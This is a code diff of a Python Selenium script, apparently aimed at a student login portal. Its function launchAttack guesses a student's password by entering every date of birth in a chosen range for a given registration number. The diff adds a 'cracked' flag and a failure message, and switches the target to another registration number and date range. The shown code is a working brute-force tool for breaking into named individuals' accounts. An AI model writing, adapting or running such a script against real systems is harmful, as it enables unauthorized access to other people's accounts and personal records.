@@ -1,3 +1,4 @@
+# Make sure you install the libraries & Dependencies first.
 import time
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
@@ -33,6 +34,7 @@ def launchAttack(studentRegNumber: str, dateOfBirths: list) -> None:
     service.creationflags = CREATE_NO_WINDOW
 
     startingTime = time.time()
+    isCracked = 0
 
     for i in range(len(dateOfBirths)):
 
@@ -54,6 +56,7 @@ def launchAttack(studentRegNumber: str, dateOfBirths: list) -> None:
         userPassword.send_keys(dateOfBirths[i])
         loginButton.click()
         if (driver.current_url != (url)):
+            isCracked = 1
             endingTime = time.time()
             print(
                 f"\n\nTotal Time Elapsed: {round((endingTime-startingTime),2)}s")
@@ -63,14 +66,18 @@ def launchAttack(studentRegNumber: str, dateOfBirths: list) -> None:
 
         driver.close()
 
+    if (isCracked == 0):
+        endingTime = time.time()
+        print(
+            f"\n\nTotal Time Elapsed: {round((endingTime-startingTime),2)}s")
+        print(f"\nCouldn't crack password in specified range. \n\n")
+
 
 def main():
 
-    driver = webdriver.Chrome()
-
-    studentRegNumber = "2020244"
-    startDate = "2001-08-01"
-    endDate = "2001-08-30"
+    studentRegNumber = "2020474"
+    startDate = "2002-11-01"
+    endDate = "2002-12-30"
     datesGenerated = []
 
     # Swap dates if starting date is larger than the ending date.
